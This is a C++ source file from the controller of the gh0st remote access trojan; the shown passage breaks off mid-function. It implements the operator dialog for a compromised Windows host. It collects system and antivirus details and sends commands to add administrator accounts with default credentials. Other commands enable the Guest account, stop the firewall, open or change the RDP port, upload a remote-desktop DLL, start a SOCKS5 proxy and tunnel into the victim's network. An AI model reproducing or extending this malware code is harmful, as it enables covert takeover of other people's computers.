// SysInfo.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "SysInfo.h"
#include "gh0stView.h"
#include "InputDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSysInfo dialog
extern CGh0stView* g_pConnectView;

CSysInfo::CSysInfo(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CSysInfo::IDD, pParent)
{
	//{{AFX_DATA_INIT(CRemoteDlg)
	m_user = _T("91zte");
	m_pass = _T("91zte");
	m_admin = _T("Administrators");
	m_port = _T("3389");
	m_addr = _T("");
	m_socks5 =  false;
	m_force = false;
	m_proxy_user = _T("admin");
	m_proxy_port = _T("1080");
	m_proxy_pass = _T("admin");
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
    IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";

	ZeroMemory(&m_SysInfo, sizeof(tagSystemInfo1));
//	ShowSysinfoList();
//	GetSysinfoList();
}

void CSysInfo::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSysInfo)
	DDX_Control(pDX, IDC_ONLINE_INFO_LIST, m_list_online);
	DDX_Control(pDX, IDC_LIST_WTS, m_list_wtsm);
	DDX_Control(pDX, IDC_LIST_SEV, m_list_sev);
	DDX_Control(pDX, IDC_SYSTEM_TAB, m_system_tab);
	DDX_Control(pDX, IDC_PROGRESS_3389, m_progress_3389);
	DDX_Control(pDX, IDC_INFO_LIST, m_list);
	DDX_Text(pDX, IDC_User, m_user);
	DDX_Text(pDX, IDC_PASSx, m_pass);
	DDX_Text(pDX, IDC_ADMIN, m_admin);
	DDX_Text(pDX, IDC_PORT, m_port);
	DDX_Text(pDX, IDC_ADDR, m_addr);
	DDX_Check(pDX, IDC_SOCKS5, m_socks5);
	DDX_Text(pDX, IDC_PROXY_PORT, m_proxy_port);
	DDX_Text(pDX, IDC_PROXY_USER, m_proxy_user);
	DDX_Text(pDX, IDC_PROXY_PASS, m_proxy_pass);
	DDX_Check(pDX, IDC_FORCE, m_force);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSysInfo, CDialog)
	//{{AFX_MSG_MAP(CSysInfo)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_CREAT, OnCreat)
	ON_BN_CLICKED(IDC_GUEST, OnGuest)
	ON_BN_CLICKED(IDC_STOP_FIRE, OnStop)
	ON_BN_CLICKED(IDC_CHANGE, OnChange)
	ON_BN_CLICKED(IDC_CONNECT, OnConnect)
	ON_BN_CLICKED(ID_PROXY, OnProxy)
	ON_BN_CLICKED(IDC_SOCKS5, OnSocks5)
	ON_BN_CLICKED(IDC_CLOSE3389, OnClose3389)
	ON_BN_CLICKED(IDC_OPEN3389, OnOpen3389)
	ON_BN_CLICKED(IDC_LAN_CONNECT, OnLanConnect)
	ON_NOTIFY(TCN_SELCHANGE, IDC_SYSTEM_TAB, OnSelchangeSystemTab)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_SEV, OnRclickListSev)
	ON_COMMAND(IDM_REFRESHPSLIST, OnRefreshpslist)
	ON_COMMAND(IDM_DELUSER, OnDeluser)
	ON_COMMAND(IDM_CHANGEPASSWORD, OnChangepassword)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_WTS, OnRclickListWts)
	ON_COMMAND(IDM_DISCONNECT_USER, OnDisconnectUser)
	ON_COMMAND(IDM_LOGOFF_USER, OnLogoffUser)
	ON_COMMAND(IDM_COPY, OnCopy)
	ON_NOTIFY(NM_RCLICK, IDC_INFO_LIST, OnRclickInfoList)
	ON_COMMAND(IDM_ACTIVE_USER, OnActiveUser)
	ON_COMMAND(IDM_DISABLEUSER, OnDisableuser)
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE_INFO_LIST, OnRclickInfoList)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSysInfo message handlers

BOOL CSysInfo::OnInitDialog() 
{
	CDialog::OnInitDialog();
	// TODO: Add extra initialization here
	CString str;
	str.Format("\\\\%s - 服务器信息",IPAddress);
	SetWindowText(str);
	
	TCHAR strSelf[MAX_PATH];
	GetModuleFileName(NULL, strSelf, sizeof(strSelf));
	m_strOperatingPath = strSelf;
	m_strOperatingPath.Format(_T("%s\\Plugins\\"), m_strOperatingPath.Mid(0, m_strOperatingPath.ReverseFind('\\')));

 	m_system_tab.InsertItem(0, _T("系统信息"));
// 	m_system_tab.InsertItem(1, _T("系统用户"));
//  	m_system_tab.InsertItem(2, _T("用户状态"));
//  	m_system_tab.InsertItem(3, _T("安装信息"));

	m_list.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
	m_list.InsertColumn(0, _T("名称"), LVCFMT_LEFT, 80);
	m_list.InsertColumn(1, _T("信息"), LVCFMT_LEFT, 220);

	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_OS));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_CPU));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_MEMORY));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_DISK));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_USERNAME));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_TIME));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_ANTI));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_IPS));
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_DOUBLE));
	m_list.SetImageList(&m_ImgList,LVSIL_SMALL);

// 	CRect rect; m_list_sev.GetClientRect( &rect );
// 	int nColInterval = rect.Width()/3;
// 	m_list_sev.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
// 	m_list_sev.InsertColumn(0, _T("用户名"),				LVCFMT_LEFT, nColInterval);
// 	m_list_sev.InsertColumn(1, _T("用户组"),				LVCFMT_LEFT, nColInterval);
// 	m_list_sev.InsertColumn(2, _T("状态"),				LVCFMT_LEFT, nColInterval);
// 
// 	m_list_wtsm.GetClientRect( &rect );
// 	nColInterval = rect.Width()/4;
// 	m_list_wtsm.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
// 	m_list_wtsm.InsertColumn( 0,  _T("状态"),				LVCFMT_LEFT, nColInterval);
// 	m_list_wtsm.InsertColumn( 1,  _T("用户名"),				LVCFMT_LEFT, nColInterval);
// 	m_list_wtsm.InsertColumn( 2,  _T("客户端名"),			LVCFMT_LEFT, nColInterval);
// 	m_list_wtsm.InsertColumn( 3,  _T("会话"),			    LVCFMT_LEFT, nColInterval);

// 	m_list_online.GetClientRect( &rect );
// 	nColInterval = rect.Width()/2;
// 	m_list_online.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT);
// 	m_list_online.InsertColumn(0, _T("名称"), LVCFMT_LEFT, nColInterval);
// 	m_list_online.InsertColumn(1, _T("信息"), LVCFMT_LEFT, nColInterval);
	
	HWND hWndHeader1 = m_list.GetDlgItem(0)->GetSafeHwnd();
	m_header1.SubclassWindow(hWndHeader1);
	m_header1.SetTheme(new CXTPHeaderCtrlThemeOffice2003());
	
// 	HWND hWndHeader2 = m_list_sev.GetDlgItem(0)->GetSafeHwnd();
// 	m_header2.SubclassWindow(hWndHeader2);
// 	m_header2.SetTheme(new CXTPHeaderCtrlThemeOffice2003());
// 	
// 	HWND hWndHeader3 = m_list_wtsm.GetDlgItem(0)->GetSafeHwnd();
// 	m_header3.SubclassWindow(hWndHeader3);
// 	m_header3.SetTheme(new CXTPHeaderCtrlThemeOffice2003());
	
// 	HWND hWndHeader4 = m_list_online.GetDlgItem(0)->GetSafeHwnd();
// 	m_header4.SubclassWindow(hWndHeader4);
// 	m_header4.SetTheme(new CXTPHeaderCtrlThemeOffice2003());
	
	ModifyDrawStyle(XTTHEME_WINXPTHEMES, 4);
	ModifyDrawStyle(HDR_XTP_HOTTRACKING, TRUE);
	ModifyDrawStyle(XTTHEME_HOTTRACKING, TRUE);
	
	SortColumn1(m_nSortedCol1, m_bAscending1);
// 	SortColumn2(m_nSortedCol2, m_bAscending2);
// 	SortColumn3(m_nSortedCol3, m_bAscending3);
//	SortColumn4(m_nSortedCol4, m_bAscending4);
	
	ShowSysinfoList();
	ShowSelectWindow();

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

void CSysInfo::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
		
	case TOKEN_SYSINFOLIST:
		ShowSysinfoList();
		break;
// 	case TOKEN_INSTALLINFOLIST:
// 		ShowInstallList();
// 		break;
	case TOKEN_ADD_SUCCESS:
		MessageBox(_T("添加账户成功!"));
		break;
	case TOKEN_ADD_ERROR:
		MessageBox(_T("添加账户失败!"));
		break;
	case TOKEN_DEL_SUCCESS:
		MessageBox(_T("删除账户成功!"));
		break;
	case TOKEN_DEL_ERROR:
		MessageBox(_T("删除账户失败!"));
		break;
	case TOKEN_STATE_ERROR:
		MessageBox(_T("用户状态更改失败!"));
		break;
	case TOKEN_STATE_SUCCESS:
		MessageBox(_T("用户状态更改成功!"));
		break;
	case TOKEN_DLL_3389:
		{	
			Sleep(50);
			m_strOperatingFile = m_strOperatingPath + (TCHAR *)m_pContext->m_DeCompressionBuffer.GetBuffer(1);//重传时也发送了一个文件名。
			SendUploadJob();
		}
		break;
	case TOKEN_DATA_CONTINUE:
		Sleep(50);
		SendFileData();
		break;
	case TOKEN_SLIST:
		ShowSevList();
		break;
	case TOKEN_WTSLIST:
		ShowWtsList();
		break;
	case TOKEN_CHANGE_PSAA_SUCCESS:
		MessageBox(_T("修改密码成功!"));
		break;
	case TOKEN_CHANGE_PSAA_ERROR:
		MessageBox(_T("修改密码失败!"));
		break;
	default:
		// 传输发生异常数据
		break;
	}
}

void CSysInfo::GetSysinfoList()
{
	BYTE bToken = COMMAND_SEND_SYSINFO;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSysInfo::ShowSysinfoList()
{
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	memcpy(&m_SysInfo, lpBuffer , sizeof(tagSystemInfo1));

	m_list.SetRedraw(FALSE);//禁止闪烁
	m_list.DeleteAllItems();
	
	CString strMemory,strDriveSize;
	strMemory.Format("共计:%dMB|可用:%dMB",m_SysInfo.szMemory,m_SysInfo.szMemoryFree);	
	strDriveSize.Format("共计:%ldG|可用:%ldG",m_SysInfo.szDriveSize,m_SysInfo.szDriveFreeSize);
	m_list.InsertItem(0, _T("主机IP") , 0);
	m_list.InsertItem(1, _T("CPU信息"), 1);
	m_list.InsertItem(2, _T("内存大小"),2);
	m_list.InsertItem(3, _T("硬盘大小"),3);
	m_list.InsertItem(4, _T("当前用户"),4);
	m_list.InsertItem(5, _T("活动时间"),5);
	m_list.InsertItem(6, _T("安全软件"),6);
	m_list.InsertItem(7, _T("远程端口"),7);
	m_list.InsertItem(8, _T("是否双开"),8);

	m_list.SetItemText(0, 1, IPAddress);
	m_list.SetItemText(1, 1, m_SysInfo.szCpuInfo);
	m_list.SetItemText(2, 1, strMemory);
	m_list.SetItemText(3, 1, strDriveSize);
	m_list.SetItemText(4, 1, m_SysInfo.szUserName);
	m_list.SetItemText(5, 1, m_SysInfo.szActiveTime);
	m_list.SetItemText(6, 1, m_SysInfo.szAntiVirus);
	m_list.SetItemText(7, 1, m_SysInfo.szRemotePort);
	m_list.SetItemText(8, 1, m_SysInfo.szOpenInfo);
	
	//更新窗口
	m_list.SetRedraw(TRUE); 
	m_list.Invalidate(); 
	m_list.UpdateWindow();	

	SetDlgItemText(IDC_ADDR, IPAddress);
	SetDlgItemText(IDC_REMOTE_PORT, m_SysInfo.szRemotePort);
}

void CSysInfo::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	BYTE bToken = COMMAND_CLOSE_PORT;
	m_iocpServer->Send(m_pContext, &bToken, 1);
	cPortMap.Stop();
	m_pContext->m_Dialog[0] = 0;
	closesocket(m_pContext->m_Socket);
	DestroyWindow();
	
}

BOOL CSysInfo::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CSysInfo::OnCreat() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString Username, Password, Administrators;
	
	GetDlgItem(IDC_User)->GetWindowText(Username);
	GetDlgItem(IDC_PASSx)->GetWindowText(Password);
	GetDlgItem(IDC_ADMIN)->GetWindowText(Administrators);

	UpdateData(TRUE);
	LPBYTE			lpBuffer = NULL;
	DWORD			dwOffset = 0;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);
	lpBuffer[0] = COMMAND_NET_USER;
	dwOffset = 1;
	
	memcpy(lpBuffer + dwOffset, Username.GetBuffer(0), (Username.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (Username.GetLength() + 1)*sizeof(TCHAR);
	
	memcpy(lpBuffer + dwOffset, Password.GetBuffer(0), (Password.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (Password.GetLength() + 1)*sizeof(TCHAR);
	
	memcpy(lpBuffer + dwOffset, Administrators.GetBuffer(0), (Administrators.GetLength() + 1)*sizeof(TCHAR));
	dwOffset += (Administrators.GetLength() + 1)*sizeof(TCHAR);
	
	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset, LMEM_ZEROINIT|LMEM_MOVEABLE);
	m_iocpServer->Send(m_pContext, lpBuffer, dwOffset);
	LocalFree(lpBuffer);
}

void CSysInfo::OnGuest() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_GUEST;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
	MessageBox(_T("命令已经发送,初始化密码为123456"), _T("提示"));
}

void CSysInfo::OnStop() 
{
	// TODO: Add your control notification handler code here
	BYTE	bToken = COMMAND_STOPFIRE;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	MessageBox(_T("命令已经发送"),_T("提示"),NULL);
}

void CSysInfo::OnConnect() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString strAddress, strPort;
	TCHAR szMSTSC[MAX_PATH], szMsg[MAX_PATH];
	GetModuleFileName(NULL, szMSTSC, sizeof(szMSTSC));
	*_tcsrchr( szMSTSC, '\\' ) = '\0';
	lstrcat(szMSTSC, _T("\\Plugins\\mstsc.exe"));
	if (GetFileAttributes(szMSTSC) == INVALID_FILE_ATTRIBUTES)
	{
		wsprintf(szMsg, _T("本地文件 %s丢失!\n无法继续连接!"), szMSTSC);
		MessageBox(szMsg, _T("警告!"), MB_ICONWARNING | MB_OK);
		return;
	}
	GetDlgItemText(IDC_ADDR, strAddress);
	GetDlgItemText(IDC_REMOTE_PORT, strPort);
	if (strAddress.IsEmpty() || strPort.IsEmpty())
	{
		AfxMessageBox(_T("请填写连接地址和端口!"));
		return;
	}
	if (m_force)
		wsprintf(szMsg, _T("/console /v:%s:"), strAddress.GetBuffer(0));
	else
		wsprintf(szMsg, _T("/v:%s:"), strAddress.GetBuffer(0));
	lstrcat(szMsg, strPort.GetBuffer(0));
	ShellExecute(NULL, _T("open"), szMSTSC, szMsg, NULL, SW_SHOWNORMAL);
}

void CSysInfo::OnProxy() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	CString ProxyPort, ProxyUser, ProxyPass;
	
	GetDlgItem(IDC_PROXY_PORT)->GetWindowText(ProxyPort);
	GetDlgItem(IDC_PROXY_USER)->GetWindowText(ProxyUser);
	GetDlgItem(IDC_PROXY_PASS)->GetWindowText(ProxyPass);

	char socks5info[100] = "\0";
	char *a = "|";

	if(m_socks5)
	{	
		ProxyUser.MakeLower();
		if (strlen(ProxyUser) < 1 | strlen(ProxyPass) < 1)
		{
			MessageBox(_T("请输入用户名和密码!!"), _T("错误"));
		}
		strcat(socks5info, ProxyPort);
		strcat(socks5info, a);
		strcat(socks5info, ProxyUser);
		strcat(socks5info, a);
		strcat(socks5info, ProxyPass);
	}
	else
	{
		strcpy(socks5info,ProxyPort);
	}

	int nPacketLength = (strlen(socks5info) + 2);
	LPBYTE lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
	lpPacket[0] = COMMAND_OPEN_PROXY;
	memcpy(lpPacket + 1, socks5info, nPacketLength);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength - 1);
	LocalFree(lpPacket);
	UpdateData(FALSE);
	MessageBox(_T("命令已经发送"), _T("提示"));
}

void CSysInfo::OnSocks5() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	GetDlgItem(IDC_PROXY_USER)->EnableWindow(m_socks5);
	GetDlgItem(IDC_PROXY_PASS)->EnableWindow(m_socks5);
}

void CSysInfo::OnClose3389() 
{
	// TODO: Add your control notification handler code here
	BYTE bToken = COMMAND_CLOSE_3389;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}

void CSysInfo::OnOpen3389() 
{
	// TODO: Add your control notification handler code here
	CString strPort;
	GetDlgItemText(IDC_PORT, strPort);
	int nPacketLength = 1 + strPort.GetLength() * 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_OPEN_3389;
	memcpy(lpPacket + 1, strPort.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete []lpPacket;
}

void CSysInfo::OnChange() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	CString strPort;
	GetDlgItemText(IDC_PORT, strPort);
	int nPacketLength = 1 + strPort.GetLength() * 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_CHANGE_PORT;
	memcpy(lpPacket + 1, strPort.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete []lpPacket;
}

void CSysInfo::SendFileData()
{
	FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	
	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);
	
	ShowProgress();
	
	if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1)
	{
		EndLocalUploadFile();
		return;
	}
	
	HANDLE	hFile;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;
	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，数据
	lpBuffer[0] = COMMAND_FILE_DATA;
	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	
	// 返回值
	bool	bRet = true;
	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);
	
	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
	LocalFree(lpBuffer);
}

void CSysInfo::ShowProgress()
{	
	if ((int)m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;
	}
	
	int	progress = (float)(m_nCounter * 100) / m_nOperatingFileLength;
	m_progress_3389.SetPos(progress);
	if (m_nCounter == m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
		// 关闭文件句柄
	}
}
void CSysInfo::EndLocalUploadFile()
{
	m_nOperatingFileLength = 0;
	CString strPort;
	GetDlgItemText(IDC_PORT, strPort);
	int nPacketLength = 1 + strPort.GetLength() * 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_DLL_3389;
	memcpy(lpPacket + 1, strPort.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete []lpPacket;
}

BOOL CSysInfo::SendUploadJob()
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	CString	fileRemote = m_strOperatingFile; // 远程文件
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		CString msg;
		msg.Format(_T("本地文件 %s 未找到"), m_strOperatingFile.GetBuffer(0));
		AfxMessageBox(msg, MB_OK, MB_ICONSTOP);
		return FALSE;
	}
	dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);
	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;
	
	CloseHandle(hFile);
	// 构造数据包，发送文件长度
	int		nPacketSize = 9;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = COMMAND_FILE_SIZE;
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
	
	LocalFree(bPacket);
	return TRUE;
}

DWORD WINAPI CSysInfo::PortTransfer( LPVOID lparam )
{	
	CSysInfo	*pThis = (CSysInfo *)lparam;
	
	pThis->cPortMap.Stop();
	
	pThis->cPortMap.PortTransfer_3(0, 0);
	//	pThis->PortTransfer_3(atoi(pThis->m_map_port), atoi(pThis->m_proxy_port));
	return 0;
}

void CSysInfo::OnLanConnect() 
{
	// TODO: Add your control notification handler code here
	CString strCmd, strPort;
	GetDlgItemText(IDC_REMOTE_PORT, strPort);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PortTransfer, this, 0, NULL);
	for (int i = 0; i < 100; i++)
	{	
		if (cPortMap.nCtrlPort != 0 && cPortMap.nServerPort != 0)
		{
			break;
		}
		Sleep(100);
	}
	strCmd.Format("%d|%d", cPortMap.nCtrlPort, atoi(strPort));
	strCmd.MakeLower();
	
	int		nPacketLength = strCmd.GetLength() + 2;
	LPBYTE	lpPacket = new BYTE[nPacketLength];
	lpPacket[0] = COMMAND_START_MAP;
	memcpy(lpPacket + 1, strCmd.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
	delete[] lpPacket;
	TCHAR szMSTSC[MAX_PATH], szMsg[MAX_PATH];
	GetModuleFileName(NULL, szMSTSC, sizeof(szMSTSC));
	*_tcsrchr( szMSTSC, '\\' ) = '\0';
	lstrcat(szMSTSC, _T("\\Control\\mstsc.exe"));
	if (GetFileAttributes(szMSTSC) == INVALID_FILE_ATTRIBUTES)
	{
		wsprintf(szMsg, _T("本地文件 %s丢失!\n无法继续连接!"), szMSTSC);
		MessageBox(szMsg, _T("警告!"), MB_ICONWARNING | MB_OK);
		return;
	}
	if (m_force)
		wsprintf(szMsg, _T("/console /v:127.0.0.1:%d"), cPortMap.nServerPort);
	else
		wsprintf(szMsg, _T("/v:127.0.0.1:%d"), cPortMap.nServerPort);

	ShellExecute(NULL, _T("open"), szMSTSC, szMsg, NULL, SW_SHOWNORMAL);
}

void CSysInfo::ShowSelectWindow()
{
// 	switch (m_system_tab.GetCurSel())
// 	{
// 	case 0:
		m_list.ShowWindow(SW_SHOW);
// 		m_list_sev.ShowWindow(SW_HIDE);
// 		m_list_wtsm.ShowWindow(SW_HIDE);
	//	m_list_online.ShowWindow(SW_HIDE);
	//	if (m_list.GetItemCount() == 0)
			GetSysinfoList();
	//	break;
// 	case 1:
// 		m_list.ShowWindow(SW_HIDE);
// 		m_list_sev.ShowWindow(SW_SHOW);
// 		m_list_wtsm.ShowWindow(SW_HIDE);
// //		m_list_online.ShowWindow(SW_HIDE);
// 		if (m_list_sev.GetItemCount() == 0)
// 			GetSevList();
// 		break;
// 	case 2:
// 		m_list.ShowWindow(SW_HIDE);
// 		m_list_sev.ShowWindow(SW_HIDE);
// 		m_list_wtsm.ShowWindow(SW_SHOW);
// // 		m_list_online.ShowWindow(SW_HIDE);
// 		if (m_list_wtsm.GetItemCount() == 0)
// 			GetWtsmList();
// 		break;
// 	case 3:
// 		m_list.ShowWindow(SW_HIDE);
// 		m_list_sev.ShowWindow(SW_HIDE);
// 		m_list_wtsm.ShowWindow(SW_HIDE);
// 		m_list_online.ShowWindow(SW_SHOW);
// 		if (m_list_online.GetItemCount() == 0)
// 			GetInstallinfoList();
// 		break;
//	}
}

void CSysInfo::ModifyDrawStyle(UINT uFlag, BOOL bRemove)
{
	CXTHeaderCtrlTheme* pTheme1 = m_header1.GetTheme();
	if (pTheme1)
	{
		DWORD dwStyle = pTheme1->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme1->SetDrawStyle(dwStyle, &m_header1);
		m_header1.RedrawWindow();
	}
	
	CXTHeaderCtrlTheme* pTheme2 = m_header2.GetTheme();
	if (pTheme2)
	{
		DWORD dwStyle = pTheme2->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme2->SetDrawStyle(dwStyle, &m_header2);
		m_header2.RedrawWindow();
	}
	
	CXTHeaderCtrlTheme* pTheme3 = m_header3.GetTheme();
	if (pTheme3)
	{
		DWORD dwStyle = pTheme3->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme3->SetDrawStyle(dwStyle, &m_header3);
		m_header3.RedrawWindow();
	}

	CXTHeaderCtrlTheme* pTheme4 = m_header4.GetTheme();
	if (pTheme4)
	{
		DWORD dwStyle = pTheme4->GetDrawStyle() & ~uFlag;
		
		if (bRemove)
			dwStyle |= uFlag;
		
		pTheme4->SetDrawStyle(dwStyle, &m_header4);
		m_header4.RedrawWindow();
	}
}

void CSysInfo::OnSelchangeSystemTab(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	ShowSelectWindow();
	*pResult = 0;
}

void CSysInfo::GetSevList()
{
	BYTE bToken = COMMAND_SLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}

void CSysInfo::ShowSevList()
{
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char	*lpTitle = NULL;
	m_list_sev.DeleteAllItems();
	CString	str;
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		str =  (char*)lpBuffer + dwOffset;
		m_list_sev.InsertItem(i, str);
		dwOffset += str.GetLength()+1;
		str =  (char*)lpBuffer + dwOffset;
		dwOffset += str.GetLength()+1;
		m_list_sev.SetItemText(i, 1, str);
		str =  (char*)lpBuffer + dwOffset;
		dwOffset += str.GetLength()+1;
		m_list_sev.SetItemText(i, 2, str);
	}
}

void CSysInfo::GetWtsmList()
{
	BYTE bToken = COMMAND_WTSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}

void CSysInfo::ShowWtsList()
{
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	
	char	*ConnectionState;  
	char	*UserName;  
	char	*DomainName; 
	char	*ProtocolType; 
	
	DWORD	dwOffset = 0;
	CString str;
	m_list_wtsm.DeleteAllItems();
	
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		
		ConnectionState = lpBuffer + dwOffset;
		m_list_wtsm.InsertItem(i, ConnectionState);
		dwOffset += lstrlen(ConnectionState)+1;
		
		UserName = lpBuffer + dwOffset;
		m_list_wtsm.SetItemText(i, 1, UserName);
		dwOffset += lstrlen(UserName)+1;
		
		DomainName = lpBuffer + dwOffset;
		m_list_wtsm.SetItemText(i, 2, DomainName);
		dwOffset += lstrlen(DomainName)+1;
		
		ProtocolType = lpBuffer + dwOffset;
		m_list_wtsm.SetItemText(i, 3, ProtocolType);
		dwOffset += lstrlen(ProtocolType)+1;
		
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		m_list_wtsm.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD)+1;
	}
}

void CSysInfo::OnRclickListSev(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	if (m_list.IsWindowVisible())
		return;
